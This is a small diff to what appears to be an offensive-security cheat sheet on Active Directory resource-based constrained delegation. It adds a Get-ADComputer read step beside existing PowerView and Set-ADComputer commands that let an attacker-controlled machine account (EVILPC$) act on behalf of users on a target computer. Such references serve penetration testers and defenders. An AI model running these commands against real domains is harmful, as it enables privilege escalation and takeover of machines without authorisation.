@@ -158,6 +158,8 @@ $SD.GetBinaryForm($SDBytes, 0)
 Set-DomainObject -Identity TARGET_COMPUTER -XOR @{'msdsallowedtoactonbehalfofotheridentity'=$SDBytes}
 
 # OR with PowerMad
+Get-ADComputer TARGET_COMPUTER -properties PrincipalsAllowedToDelegateToAccount
+
 Set-ADComputer TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount EVILPC$
 ```
 
